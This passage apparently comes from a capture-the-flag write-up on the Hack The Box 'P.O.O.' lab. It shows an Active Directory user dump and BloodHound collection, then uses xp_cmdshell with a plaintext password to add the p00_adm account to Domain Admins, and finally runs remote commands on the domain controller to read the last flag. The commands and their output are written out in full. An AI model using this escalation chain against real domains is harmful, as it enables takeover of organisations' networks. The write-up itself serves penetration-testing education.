lastlogontimestamp    : 4/11/2018 8:59:32 PM
name                  : p00_adm
objectsid             : S-1-5-21-2413924783-1155145064-2969042445-1107
samaccountname        : p00_adm
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : 1/1/1601 2:00:00 AM
countrycode           : 0
whenchanged           : 4/11/2018 5:59:32 PM
instancetype          : 4
objectguid            : 3a04555f-c783-4b22-afeb-28ac72154842
lastlogon             : 4/12/2018 12:45:33 AM
lastlogoff            : 1/1/1601 2:00:00 AM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poo
dscorepropagationdata : 1/1/1601 12:00:00 AM
serviceprincipalname  : cyber_audit/intranet.poo:443
memberof              : CN=P00 Help Desk,CN=Users,DC=intranet,DC=poo
whencreated           : 3/21/2018 7:07:23 PM
badpwdcount           : 0
cn                    : p00_adm
useraccountcontrol    : NORMAL_ACCOUNT
usncreated            : 25722
primarygroupid        : 513
pwdlastset            : 3/22/2018 2:39:53 PM
usnchanged            : 69768
```

We can copy the BloodHound files to our local computer using WinRM:

```
PS C:\Users\snowscan> $session = new-pssession -computername [dead:babe::1001] -credential $Credential
PS C:\Users\snowscan> copy-item -fromsession $session -path c:\temp\*.csv -destination .
PS C:\Users\snowscan>
```

Now, let's load all these files in Bloodhound...

![Bloodhound](/assets/images/htb-writeup-poo/Screenshot_17.png)

![Bloodhound](/assets/images/htb-writeup-poo/Screenshot_18.png)

Wow, p00_adm has GenericAll access to all lot of groups, including Domain Admins!

https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/

> TL;DR: if we control an object that has SeEnableDelegationPrivilege in the domain, AND said object has GenericAll/GenericWrite rights over any other user object in the domain, we can compromise the domain at will, indefinitely.

We'll try using MSSQL again and run commands p00_adm and see if we can escalate to Domain Admin.

`xp_cmdshell 'powershell -c "import-module c:\temp\p.ps1; $SecPassword = ConvertTo-SecureString \"ZQ!5t4r\" -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential(\"intranet.poo\p00_adm\", $SecPassword); Add-DomainGroupMember -Identity \"Domain Admins\" -Members \"p00_adm\" -Credential $Cred "'`

Command has executed successfully, let's log in:

```
PS C:\Users\snowscan> $SecPassword = ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -Force
PS C:\Users\snowscan> $Credential = New-Object System.Management.Automation.PSCredential('intranet.poo\p00_adm', $SecPassword)
PS C:\Users\snowscan> enter-pssession -computername [dead:babe::1001] -credential $Credential
[[dead:babe::1001]]: PS C:\Users\p00_adm\Documents> whoami
poo\p00_adm
```

Ok, we are now logged in as `p00_adm`, we can run commands on the DC by using `invoke-command`:

```
[[dead:babe::1001]]: PS C:\Users\p00_adm\Documents> invoke-command -credential $credential -computername dc -scriptblock { dir c:\users}


    Directory: C:\users


Mode                LastWriteTime         Length Name                                PSComputerName
----                -------------         ------ ----                                --------------
d-----        3/15/2018   1:20 AM                Administrator                       dc
d-----        3/15/2018  12:38 AM                mr3ks                               dc
d-----        4/12/2018   4:37 AM                p00_adm                             dc
d-r---       11/21/2016   3:24 AM                Public                              dc

[[dead:babe::1001]]: PS C:\Users\p00_adm\Documents> invoke-command -credential $credential -computername dc -scriptblock { dir c:\users\mr3ks}


    Directory: C:\users\mr3ks


Mode                LastWriteTime         Length Name                                PSComputerName
----                -------------         ------ ----                                --------------
d-r---        3/22/2018  11:17 PM                Contacts                            dc
d-r---         4/7/2018   1:06 PM                Desktop                             dc
d-r---        3/22/2018  11:17 PM                Documents                           dc
d-r---         4/7/2018  12:51 PM                Downloads                           dc
d-r---        3/22/2018  11:17 PM                Favorites                           dc
d-r---        3/22/2018  11:17 PM                Links                               dc
d-r---        3/22/2018  11:17 PM                Music                               dc
d-r---        3/22/2018  11:17 PM                Pictures                            dc
d-r---        3/22/2018  11:17 PM                Saved Games                         dc
d-r---        3/22/2018  11:17 PM                Searches                            dc
d-r---        3/22/2018  11:17 PM                Videos                              dc


[[dead:babe::1001]]: PS C:\Users\p00_adm\Documents> invoke-command -credential $credential -computername dc -scriptblock { dir c:\users\mr3ks\desktop}


    Directory: C:\users\mr3ks\desktop


Mode                LastWriteTime         Length Name                                PSComputerName
----                -------------         ------ ----                                --------------
-a----        3/26/2018   5:47 PM             37 flag.txt                            dc


[[dead:babe::1001]]: PS C:\Users\p00_adm\Documents> invoke-command -credential $credential -computername dc -scriptblock { type c:\users\mr3ks\desktop\flag.txt}
POO{1196ef8bc523f0...}
```

Jackpot! We got the last flag: `POO{1196ef8bc523f0...}`